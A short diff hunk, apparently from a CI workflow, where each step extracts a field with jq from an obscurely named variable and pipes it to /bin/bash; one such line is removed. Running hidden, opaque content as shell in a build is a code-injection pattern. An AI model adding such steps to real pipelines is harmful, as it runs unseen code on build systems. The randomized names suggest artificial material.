@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$zmvcu06" | jq -r .ticko276 | /bin/bash
           echo $proq71048 | jq -r .wyw65250 | /bin/bash
           printf '%s' "$br57" | jq -r .e90445 | /bin/bash
-          printf '%s' "$tloex68952" | jq -r .tvz54277 | /bin/bash
           echo $aa7362 | jq -r .nx65397 | /bin/bash
           printf '%s' "$zjot5222" | jq -r .nm5286 | /bin/bash
 
